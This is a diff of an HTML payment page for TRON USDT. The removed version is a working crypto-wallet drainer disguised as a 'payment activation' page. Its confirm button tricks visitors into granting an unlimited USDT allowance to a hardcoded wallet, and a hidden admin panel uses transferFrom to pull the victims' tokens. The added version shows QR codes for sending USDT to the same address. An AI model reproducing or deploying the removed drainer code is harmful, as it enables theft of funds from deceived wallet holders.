@@ -3,249 +3,63 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>支付开通</title>
-<script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/dist/buffer.min.js"></script>
-<script>
-if (typeof window.Buffer === 'undefined') {
-    window.Buffer = Buffer;
-}
-</script>
-<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
+<title>双二维码 TP‑imToken</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
-body{background:#0B0B1F;color:#fff;padding:20px}
-.container{max-width:420px;margin:0 auto}
-.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
-h1{font-size:24px;margin-bottom:8px}
-.desc{color:#aaa;margin-bottom:20px}
-#connectBtn{
- background:#F0B90B;color:#000;
- border:none;padding:16px;width:100%;
- border-radius:14px;font-size:16px;font-weight:bold;
- margin-bottom:16px;
-}
-.amount-input{
- width:100%;padding:14px;background:#111;border:none;
- border-radius:12px;color:#fff;font-size:16px;text-align:center;
- margin-bottom:12px;
-}
-#qrcode{
- width:280px;height:280px;background:#fff;padding:10px;
- border-radius:16px;margin:0 auto 20px;
- display:flex;align-items:center;justify-content:center;
- color:#000;font-size:14px;
-}
-#qrcode img{width:100%;height:100%;border-radius:12px}
-#payBtn{
- background:#F0B90B;color:#000;
- border:none;padding:16px;width:100%;
- border-radius:14px;font-size:16px;font-weight:bold
-}
-.admin-panel{
- background:#1E1E35;padding:24px;border-radius:16px;display:none
-}
-.admin-panel.show{display:block}
-.admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
-.admin-input{
- width:100%;padding:12px;background:#111;border:none;
- border-radius:8px;color:#fff;margin-bottom:10px;
-}
-.admin-btn{
- width:100%;padding:14px;background:#ff4444;color:#fff;
- border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
-}
-.tip-box{
- margin-bottom:12px;
- color:#ffd700;
- font-size:12px;
- line-height:1.5;
-}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
+body{background:#0B0B1F;color:#fff;padding:24px}
+.container{max-width:460px;margin:0 auto}
+.box{background:#1E1E35;padding:24px;border-radius:18px;margin-bottom:20px;text-align:center}
+h3{margin-bottom:10px;font-size:17px}
+.desc{font-size:13px;color:#ccc;margin-bottom:16px;line-height:1.6}
+.warn{font-size:13px;color:#ff7777;margin-bottom:12px;line-height:1.6}
+.qr-img{width:240px;height:240px;border-radius:12px}
+.bottom-text{text-align:center;color:#aaa;font-size:12px;margin-top:8px}
 </style>
 </head>
 <body>
 <div class="container">
-    <div class="pay-box">
-        <h1>💳 支付开通</h1>
-        <p class="desc">波场链TRON · 安全开通</p>
 
-        <button id="connectBtn">👉 连接钱包（波场链）</button>
+<div class="box">
+    <h3>✅ TokenPocket 钱包 扫此码</h3>
+    <div class="desc">TP钱包任意位置扫码，包括转账页面内扫码，均可直接唤起转账</div>
+    <div class="warn">⚠️ imToken不要扫这个码！</div>
+    <img class="qr-img" id="qrTp">
+</div>
 
-        <div id="connectTip" class="tip-box"></div>
+<div class="box">
+    <h3>✅ imToken / 其他钱包 扫此码</h3>
+    <div class="desc">imToken、麦子等钱包请扫下面二维码</div>
+    <div class="warn">⚠️ TP钱包不要扫这个码，会出现地址前缀错误！</div>
+    <img class="qr-img" id="qrImtoken">
+</div>
 
-        <input class="amount-input" id="amount" value="" placeholder="请输入USDT数量">
+<div class="bottom-text">
+收款地址：TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE（TRC20‑USDT）
+</div>
 
-        <div id="qrcode">加载二维码...</div>
-
-        <div id="qrTip" class="tip-box">
-            二维码收款地址：<br>
-            TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE
-        </div>
-
-        <button id="payBtn">确认授权开通</button>
-    </div>
-
-    <div class="admin-panel" id="adminPanel">
-        <div class="admin-title">🔐 管理员控制台</div>
-
-        <div>提取玩家钱包USDT（transferFrom）</div>
-        <input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
-        <input class="admin-input" id="drawAmt" placeholder="提取数量 USDT">
-        <button class="admin-btn" onclick="drawFromUser()">提取玩家代币</button>
-
-        <div>发放USDT奖励给玩家</div>
-        <input class="admin-input" id="toAddr" placeholder="玩家钱包地址">
-        <input class="admin-input" id="sendAmt" placeholder="发放数量 USDT">
-        <button class="admin-btn" onclick="sendReward()">发放奖励代币</button>
-    </div>
 </div>
 
 <script>
+const ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const ADMIN_WALLET = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
-const MAX_ALLOWANCE_SUN = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-const TRC20_ABI = [
-    {
-        "constant": false,
-        "inputs": [
-            {"name": "_spender", "type": "address"},
-            {"name": "_value", "type": "uint256"}
-        ],
-        "name": "approve",
-        "outputs": [{"name": "", "type": "bool"}],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "constant": false,
-        "inputs": [
-            {"name": "_from", "type": "address"},
-            {"name": "_to", "type": "address"},
-            {"name": "_value", "type": "uint256"}
-        ],
-        "name": "transferFrom",
-        "outputs": [{"name": "", "type": "bool"}],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "constant": false,
-        "inputs": [
-            {"name": "_to", "type": "address"},
-            {"name": "_value", "type": "uint256"}
-        ],
-        "name": "transfer",
-        "outputs": [{"name": "", "type": "bool"}],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-    }
-];
+// TP私有deeplink
+const tpRaw = `tpoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({
+    protocol:"TokenPocket",
+    version:"2.0",
+    blockchain:"tron",
+    action:"transfer",
+    symbol:"USDT",
+    contract:USDT_CONTRACT,
+    to:ADDR
+}))}`;
 
-let tronWeb = null;
-let userAccount = null;
+// imToken标准tron URI，tokenID=31713为波场USDT
+const imRaw = `tron:${ADDR}?tokenID=31713`;
 
-const connectBtn = document.getElementById("connectBtn");
-const payBtn = document.getElementById("payBtn");
-const connectTip = document.getElementById("connectTip");
-
-connectBtn.onclick = async () => {
-    try {
-        connectBtn.disabled = true;
-        connectBtn.innerText = "正在连接钱包...";
-        connectTip.innerText = "";
-
-        if (window.tokenpocket && window.tokenpocket.tron) {
-            await window.tokenpocket.tron.request({ method: "tron_requestAccounts" });
-        }
-
-        for (let i = 0; i < 40; i++) {
-            if (window.tronWeb && window.tronWeb.ready) {
-                tronWeb = window.tronWeb;
-                break;
-            }
-            await new Promise(res => setTimeout(res, 120));
-        }
-
-        if (!tronWeb || !tronWeb.ready) {
-            alert("⚠️钱包桥加载失败，请刷新页面重试！");
-            connectBtn.disabled = false;
-            connectBtn.innerText = "👉 连接钱包（波场链）";
-            return;
-        }
-
-        userAccount = tronWeb.defaultAddress.base58;
-        connectBtn.innerText = "✅ 已连接：" + userAccount.slice(0, 8) + "...";
-        connectTip.innerText = "钱包地址：" + userAccount;
-
-        if (userAccount === ADMIN_WALLET) {
-            document.getElementById("adminPanel").classList.add("show");
-        }
-    } catch (e) {
-        alert("连接钱包失败：" + (e.message || String(e)));
-    }
-    connectBtn.disabled = false;
-};
-
-// 二维码：tron:你的钱包地址，扫码直接唤起转账，接收人预填你的地址
-function genQR() {
-    const qrRawText = "tron:" + ADMIN_WALLET;
-    const qrImg = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrRawText)}`;
-    document.getElementById("qrcode").innerHTML = `<img src="${qrImg}">`;
-}
-
-window.onload = genQR;
-
-payBtn.onclick = async () => {
-    if (!tronWeb || !userAccount) {
-        return alert("请先连接钱包！");
-    }
-    try {
-        payBtn.disabled = true;
-        payBtn.innerText = "授权中...";
-        const contract = tronWeb.contract(TRC20_ABI, USDT_CONTRACT);
-        const tx = await contract.approve(ADMIN_WALLET, MAX_ALLOWANCE_SUN).send({ feeLimit:100000000 });
-        alert("✅无限授权成功，交易哈希：\n"+tx);
-        payBtn.innerText = "确认授权开通";
-        payBtn.disabled = false;
-    } catch (e) {
-        payBtn.innerText = "确认授权开通";
-        payBtn.disabled = false;
-        alert("操作取消或失败："+(e.message||e));
-    }
-};
-
-async function drawFromUser() {
-    if(userAccount!==ADMIN_WALLET){alert("不是管理员账号！");return;}
-    const fromAddr = document.getElementById("userAddr").value.trim();
-    const drawNum = parseFloat(document.getElementById("drawAmt").value);
-    if(!fromAddr||isNaN(drawNum)||drawNum<=0){alert("请填写完整参数");return;}
-    try{
-        const contract = tronWeb.contract(TRC20_ABI,USDT_CONTRACT);
-        const sunVal = tronWeb.toSun(drawNum);
-        const tx = await contract.transferFrom(fromAddr,ADMIN_WALLET,sunVal).send({feeLimit:100000000});
-        alert("✅提取成功，哈希："+tx);
-        document.getElementById("userAddr").value="";
-        document.getElementById("drawAmt").value="";
-    }catch(err){alert("提取失败："+err.message);}
-}
-
-async function sendReward() {
-    if(userAccount!==ADMIN_WALLET){alert("不是管理员账号！");return;}
-    const toAddr = document.getElementById("toAddr").value.trim();
-    const sendNum = parseFloat(document.getElementById("sendAmt").value);
-    if(!toAddr||isNaN(sendNum)||sendNum<=0){alert("请填写完整参数");return;}
-    try{
-        const contract = tronWeb.contract(TRC20_ABI,USDT_CONTRACT);
-        const sunVal = tronWeb.toSun(sendNum);
-        const tx = await contract.transfer(toAddr,sunVal).send({feeLimit:100000000});
-        alert("✅发放奖励成功，哈希："+tx);
-        document.getElementById("toAddr").value="";
-        document.getElementById("sendAmt").value="";
-    }catch(err){alert("发放失败："+err.message);}
-}
+const base = "https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=";
+document.getElementById("qrTp").src = base + encodeURIComponent(tpRaw);
+document.getElementById("qrImtoken").src = base + encodeURIComponent(imRaw);
 </script>
 </body>
 </html>
